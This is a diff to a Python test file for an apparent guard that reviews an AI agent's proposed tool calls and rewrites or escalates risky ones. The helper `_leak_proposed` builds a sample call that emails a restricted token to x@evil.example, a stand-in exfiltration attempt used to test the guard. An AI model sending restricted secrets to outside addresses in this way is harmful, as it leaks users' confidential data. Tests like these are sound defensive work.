@@ -611,15 +611,8 @@ def test_rewrite_round_trips_nested_arguments_as_real_structures_not_json_string
     assert decoded["opts"] == {"html": True}
 
 
-def test_rewrite_substituting_an_undeclared_tool_escalates_instead_of_offering_it():
-    """The guard's default (no allowed_tools) means nothing is "declared": a rewrite
-    that would hand back a tool the caller's own policy never named (email_draft, when
-    only email_send was ever proposed) must escalate rather than silently offer a tool
-    the caller's agent may not even have.
-    """
-    guard = HarisGuard()  # no allowed_tools declared
-    token = "RESTRICTED-77BB3344"
-    proposed = {
+def _leak_proposed(token: str) -> dict:
+    return {
         "id": "c1",
         "type": "function",
         "function": {
@@ -627,8 +620,55 @@ def test_rewrite_substituting_an_undeclared_tool_escalates_instead_of_offering_i
             "arguments": json.dumps({"to": "x@evil.example", "body": f"key {token}"}),
         },
     }
+
+
+def test_rewrite_with_no_policy_tool_lists_at_all_is_offered_like_the_core_would():
+    """Round 2 review: an empty `allowed_tools` means UNRESTRICTED everywhere else in
+    this codebase (rewrite.py:163, planner.py:348), not "nothing declared". A guard
+    built with no tool lists at all -- its default configuration, and what the demo
+    following this task uses to show "rewrite, not refusal" -- must render the core's
+    own downgrade exactly as `/v1/decision` would, not escalate over it.
+    """
+    guard = HarisGuard()  # no allowed_tools, no consequential_tools, no confirmation_required_tools
+    token = "RESTRICTED-77BB3344"
     verdict = guard.check(
-        goal="Reply.", proposed=proposed, sources=[Source(text=f"key {token}", sensitivity="restricted")]
+        goal="Reply.", proposed=_leak_proposed(token), sources=[Source(text=f"key {token}", sensitivity="restricted")]
+    )
+    assert verdict.decision == "rewrite"
+    assert "GUARD_REWRITE_TOOL_UNDECLARED" not in verdict.reason_codes
+    assert verdict.rewritten["function"]["name"] == "email_draft"
+
+
+def test_rewrite_tool_declared_only_via_consequential_or_confirmation_lists_is_offered():
+    """`declared_tools` is the UNION of all three policy lists, not `allowed_tools`
+    alone: a caller who names a tool only in `consequential_tools`/
+    `confirmation_required_tools` has still told the guard that tool exists.
+    """
+    guard = HarisGuard(consequential_tools=["email_send"], confirmation_required_tools=["email_draft"])
+    token = "RESTRICTED-88CC5566"
+    verdict = guard.check(
+        goal="Reply.", proposed=_leak_proposed(token), sources=[Source(text=f"key {token}", sensitivity="restricted")]
+    )
+    assert verdict.decision == "rewrite"
+    assert "GUARD_REWRITE_TOOL_UNDECLARED" not in verdict.reason_codes
+    assert verdict.rewritten["function"]["name"] == "email_draft"
+
+
+def test_rewrite_substituting_an_undeclared_tool_still_escalates_once_something_is_declared():
+    """The round-1 protection must survive round 2's reconciliation: once the caller
+    HAS opted into a specific toolset, a substitution outside that set is still
+    declined in favour of an escalate.
+
+    `consequential_tools=["email_send"]` only (no `email_draft` anywhere, and
+    `allowed_tools` left empty/unrestricted) is deliberate: with `allowed_tools` empty,
+    `rewrite.py`'s OWN allow-list check (`rewrite.py:163`) does not itself withhold the
+    email_draft alternative -- the core proposes it -- so this scenario isolates the
+    GUARD's own declared-tools check rather than accidentally re-testing the core's.
+    """
+    guard = HarisGuard(consequential_tools=["email_send"])
+    token = "RESTRICTED-99DD7788"
+    verdict = guard.check(
+        goal="Reply.", proposed=_leak_proposed(token), sources=[Source(text=f"key {token}", sensitivity="restricted")]
     )
     assert verdict.decision == "escalate"
     assert "GUARD_REWRITE_TOOL_UNDECLARED" in verdict.reason_codes
